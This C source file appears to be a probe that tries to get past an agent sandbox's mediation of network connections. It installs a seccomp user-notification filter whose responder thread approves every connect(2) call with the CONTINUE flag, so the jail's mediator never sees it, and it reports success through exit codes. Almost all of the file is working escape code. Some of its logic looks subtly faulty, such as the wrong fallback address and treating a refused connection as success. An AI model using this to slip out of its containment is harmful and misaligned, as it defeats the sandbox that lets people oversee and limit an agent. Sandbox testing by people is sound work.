// Agent-profile connect-mediation bypass probe.
// Installs a seccomp filter with SECCOMP_FILTER_FLAG_NEW_LISTENER returning
// USER_NOTIF for connect(2), then replies SECCOMP_USER_NOTIF_FLAG_CONTINUE —
// which allows the syscall WITHOUT re-evaluating lower-precedence filters.
// If the jail's mediation (agent profile) is outranked, connect(2) executes
// unmediated: our own workspace unix socket connects instead of being
// refused by the mediator.
// Exit codes: 10 = mediation bypassed (connect succeeded)
//             11 = connect still mediated/refused
//             12 = listener installation denied
#define _GNU_SOURCE
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <unistd.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>

struct seccomp_notif_addreq {
  __u64 id;
  __u32 flags;
  struct seccomp_data data;
  int error;
  __u32 val;
};

static int listener_fd = -1;

static void *responder(void *arg) {
  (void)arg;
  for (;;) {
    struct pollfd p = {.fd = listener_fd, .events = POLLIN};
    if (poll(&p, 1, -1) < 0) continue;
    struct seccomp_notif req;
    memset(&req, 0, sizeof req);
    if (syscall(__NR_ioctl, listener_fd, SECCOMP_IOCTL_NOTIF_RECV, &req) < 0) {
      if (errno == ENOENT || errno == EFAULT) continue;
      perror("notif_recv"); return NULL;
    }
    struct { __u64 id; __u32 flags; __u64 response; } resp = {
      .id = req.id, .flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE, .response = 0 };
    syscall(__NR_ioctl, listener_fd, SECCOMP_IOCTL_NOTIF_SEND, &resp);
  }
  return NULL;
}

int main(void) {
  // socketpair target socket in cwd: mediator refuses anything but the pinned
  // proxy socket, so an unmediated connect() to OUR socket is the oracle.
  struct sockaddr_un addr = {.sun_family = AF_UNIX};
  const char *path = "/tmp/bypass_probe.sock";
  unlink(path);
  int srv = socket(AF_UNIX, SOCK_STREAM, 0);
  addr.sun_path[0] = '\0';
  snprintf(addr.sun_path + 1, sizeof addr.sun_path - 1, "bypass_probe_abs");
  if (bind(srv, (struct sockaddr *)&addr, sizeof addr) < 0 ||
      listen(srv, 1) < 0) {
    // abstract bind may fail in-jail; fall back to filesystem socket in cwd
    unlink(path);
    struct sockaddr_un fa = {.sun_family = AF_UNIX};
    snprintf(fa.sun_path, sizeof fa.sun_path, "%s", path);
    if (bind(srv, (struct sockaddr *)&fa, sizeof fa) < 0 || listen(srv, 1) < 0) {
      printf("setup: %s\n", strerror(errno));
      return 3;
    }
  }

  prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);

  struct sock_filter code[] = {
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 0),  // seccomp_data.nr is at offset 0
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_connect, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_USER_NOTIF),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
  };
  struct sock_fprog prog = {.len = 4, .filter = code};
  // seccomp_data layout: nr(u32) arch(u32) ip(u64) args[6](u64) — nr at offset 0.
  listener_fd = syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER,
                        SECCOMP_FILTER_FLAG_NEW_LISTENER, &prog);
  if (listener_fd < 0) {
    printf("seccomp(NEW_LISTENER): %s\n", strerror(errno));
    return 12;
  }
  printf("listener installed fd=%d — child NEW_LISTENER NOT denied\n", listener_fd);

  pthread_t t;
  pthread_create(&t, NULL, responder, NULL);

  int c = socket(AF_UNIX, SOCK_STREAM, 0);
  int rc = connect(c, (struct sockaddr *)&addr, sizeof addr);
  printf("connect rc=%d errno=%d (%s)\n", rc, errno, strerror(errno));
  if (rc == 0 || errno == ECONNREFUSED || errno == EAGAIN) {
    printf("MEDIATION BYPASSED: connect executed unmediated\n");
    return 10;
  }
  printf("connect refused (mediated or unreachable)\n");
  return 11;
}
